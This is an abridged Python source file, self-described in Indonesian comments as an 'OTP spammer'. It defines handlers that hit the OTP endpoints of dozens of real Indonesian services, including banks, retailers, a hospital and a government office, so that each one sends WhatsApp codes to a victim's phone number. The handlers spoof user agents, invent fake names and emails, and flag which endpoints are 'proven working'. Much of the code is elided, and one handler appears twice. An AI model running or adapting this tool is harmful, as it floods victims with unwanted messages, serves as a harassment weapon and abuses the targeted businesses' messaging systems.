#!/usr/bin/env python3
# handlers.py - OTP Spammer Handlers (PERBAIKAN LENGKAP)
...
def send_planetban_otp(phone_number):
    """PlanetBan - Send OTP via WhatsApp"""
...
def send_hashmicro_otp(phone_number):
    """HashMicro - Send OTP via WhatsApp"""
    ...
    form_data = {
        ...
        'position':'43','team':'6','honeypot':'','ipaddrs':'','uip':'',
...
def send_internetrakyat_otp(phone_08):
    """Internet Rakyat - Send OTP via WhatsApp"""
...
def send_ultramilk_register(phone_number):
    """Ultramilk - Send OTP via WhatsApp"""
...
def send_jembatani_otp(phone_number, name, password):
    """Jembatani - Send OTP via WhatsApp"""
    headers = {
...
def send_sahabatteknisi_otp(phone_number):
    """Sahabat Teknisi - Send OTP via WhatsApp"""
...
def send_auto2000_otp(phone_08):
    """Auto2000 - Send OTP via WhatsApp"""
...
def send_astra_daihatsu_otp(phone_62):
    """Astra Daihatsu - Send OTP via WhatsApp"""
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
...
def send_royal_canin_otp(phone_plus):
    """Royal Canin - Send OTP via WhatsApp"""
    sess = requests.Session()
    sess.headers.update({
...
def send_99co_otp(phone_plus):
    """99.co - Send OTP via WhatsApp"""
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiJldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0..CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
...
def send_belirumah_otp(phone_plus):
    """BeliRumah - Send OTP via WhatsApp"""
...
def send_fastwork_otp(phone_08):
    """Fastwork - Send OTP via WhatsApp"""
...
def send_beautyhaul_otp(local_number):
    """Beautyhaul - Send OTP via WhatsApp"""
...
def send_minumyukkaka_otp(phone_08):
    """MinumYukKaka - Send OTP via WhatsApp"""
    session = requests.Session()
...
def send_sidemang_otp(phone_08):
    """SIDEMANG - Send OTP via WhatsApp"""
...
def send_lapormasbup_otp(phone_08):
    """LaporMasBup - Send OTP via WhatsApp"""
...
def send_ptsp_kemenag_otp(phone_08):
    """PTSP Kemenag - Send OTP via WhatsApp"""
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
...
# ==================== API YANG TERBUKTI BISA (DARI SCREENSHOT) ====================

# 26. UANGME - BISA
def send_uangme_otp(phone_08):
    """UangMe - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
    import random
    import string
    ...
    url = f"https://api.uangme.com/api/v2/sms_code?phone={phone_08}&scene_type=login&send_type=wp"
    
    headers = {
        "Host": "api.uangme.com",
        "aid": f"gaid_15497a9b-2669-42cf-ad10-{codex(12)}",
...
# 27. MATAHARI - BISA
def send_matahari_otp(phone_08):
    """Matahari - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
...
# 28. ISELLER - BISA
def send_iseller_otp(phone_08):
    """iSeller - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
    url = "https://api.iseller.co.id/v2/auth/otp/request"
    headers = {
        "Host": "api.iseller.co.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.iseller.co.id",
        "referer": "https://www.iseller.co.id/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {
...
# 29. UNILEVER - BISA
def send_unilever_otp(phone_08):
    """Unilever - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = {
        "Host": "www.bonusbelanja.com",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
...
# 30. PAPER ID - BISA
def send_paperid_otp(phone_08):
    """Paper ID - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {
        "Host": "register.paper.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
...
# 31. RS BUNDA - BISA
def send_rsbunda_otp(phone_08):
    """RS Bunda - Send OTP via WhatsApp (✅ TERBUKTI BISA)"""
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = {
        "Host": "cms.bunda.co.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
...
# 32. FASTWORK - BISA
# Sudah ada di handler 19

# 33. PLANETBAN - BISA
# Sudah ada di handler 3

# 34. INTERNET RAKYAT - BISA
# Sudah ada di handler 7

# 35. ASTRA DAIHATSU - BISA
# Sudah ada di handler 14

# ==================== API YANG SUDAH DIPERBAIKI ====================

# 36. DUNIA GAMES - PERBAIKAN
def send_duniagames_otp(phone_08):
    """Dunia Games - Send OTP via WhatsApp (🔄 DIPERBAIKI)"""
...
# 37. ADIRAKU - PERBAIKAN
def send_adiraku_otp(phone_08):
    """ADIRAKU - Send OTP via WhatsApp (🔄 DIPERBAIKI)"""
...
# 38. DOKTERIN - PERBAIKAN
# ==================== HANDLER: DOKTERIN ====================
def send_dokterin_otp(phone_08):
    """DokterIN - Send OTP via WhatsApp"""
    if not phone_08 or len(phone_08) < 10:
        return None
    
    url = "https://dokterin.co.id/api/v1/auth/otp/request"
    ...
    headers = {
        ...
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://dokterin.co.id",
        "Referer": "https://dokterin.co.id/",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
...
# 39. JAGO - PERBAIKAN
def send_jago_otp(phone_08):
    """Jago - Send OTP via WhatsApp (🔄 DIPERBAIKI)"""
    url = "https://api.jago.com/v1/auth/otp/send"
...
# 40. ASTRONAUTS - PERBAIKAN
def send_astronauts_otp(phone_08):
    """Astronauts - Send OTP via WhatsApp (🔄 DIPERBAIKI)"""
    url = "https://api.astronauts.id/v1/auth/otp/send"
...
# 41. SATURDAYS - PERBAIKAN
def send_saturdays_otp(phone_08):
    """Saturdays - Send OTP via WhatsApp (🔄 DIPERBAIKI)"""
    url = "https://api.saturdays.com/v1/auth/otp/send"
    
    headers = {
        "Host": "api.saturdays.com",
        "Content-Type": "application/json",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
...
# ==================== HANDLER: BLIBLI TIKET ====================
def send_bliblitiket_otp(phone_08):
    """Blibli Tiket - Send OTP via WhatsApp (SPAM VERSION)"""
    url = "https://api.blibli.com/mobile/v1/otp/send"
        ...
        if response.status_code == 200:
            try:
                ...
                if data.get('code') == 200 or data.get('status') == 'SUCCESS':
                    return {"status": "success", "message": data.get('message', 'OTP terkirim'), "data": data}
                else:
                    return {"status": "failed", "message": data.get('message', 'Gagal kirim OTP'), "data": data}
            except:
                return {"status": "error", "message": "Response bukan JSON", "data": response.text}
        else:
            return {"status": "error", "message": f"HTTP {response.status_code}", "data": response.text}
            
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Timeout - koneksi lambat"}
...
# ==================== HANDLER: KREDIT PINTAR ====================
def send_kreditpintar_otp(phone_08):
    """Kredit Pintar - Send OTP via WhatsApp"""
    url = "https://api.kreditpintar.com/v1/auth/otp/request"
    
    headers = {
        "Host": "api.kreditpintar.com",
        "Content-Type": "application/json",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
...
# ==================== HANDLER: TIPTIP ====================
def send_tiptip_otp(phone_08):
    """TipTip - Send OTP via WhatsApp"""
    url = "https://api.tiptip.id/v1/auth/otp/request"
...
# ==================== HANDLER: SATURDAYS ====================
# ⚠️ BELUM DITEMUKAN ENDPOINT - COBA ENDPOINT UMUM
def send_saturdays_otp(phone_08):
    """Saturdays - Send OTP via WhatsApp (Endpoint belum terverifikasi)"""
    endpoints = [
        "https://api.saturdays.com/v1/auth/otp/send",
        "https://www.saturdays.com/api/v1/auth/otp/send",
        "https://api.saturdays.id/v1/auth/otp/send",
    ]
...
# ==================== HANDLER: SEJAHTERA VERIFY ====================
# ⚠️ BELUM DITEMUKAN - COBA ENDPOINT UMUM
def send_sejahtera_otp(phone_08):
    """Sejahtera Verify - Send OTP via WhatsApp (Endpoint belum terverifikasi)"""
    endpoints = [
        "https://api.sejahtera.com/v1/auth/otp/send",
        "https://api.sejahtera.id/v1/auth/otp/send",
        "https://www.sejahtera.com/api/auth/otp/send",
    ]
    ...
    headers = {
        ...
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://sejahtera.com",
        "Referer": "https://sejahtera.com/",
        "Connection": "keep-alive",
    }
...
# ==================== HANDLER: VOLTA ====================
# ⚠️ BELUM DITEMUKAN - COBA ENDPOINT UMUM
def send_volta_otp(phone_08):
    """Volta - Send OTP via WhatsApp (Endpoint belum terverifikasi)"""
    endpoints = [
        "https://api.volta.co.id/v1/auth/otp/send",
        "https://api.volta.id/v1/auth/otp/send",
        "https://www.volta.com/api/auth/otp/send",
    ]
    ...
    headers = {
        ...
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://volta.co.id",
        "Referer": "https://volta.co.id/",
        "Connection": "keep-alive",
    }
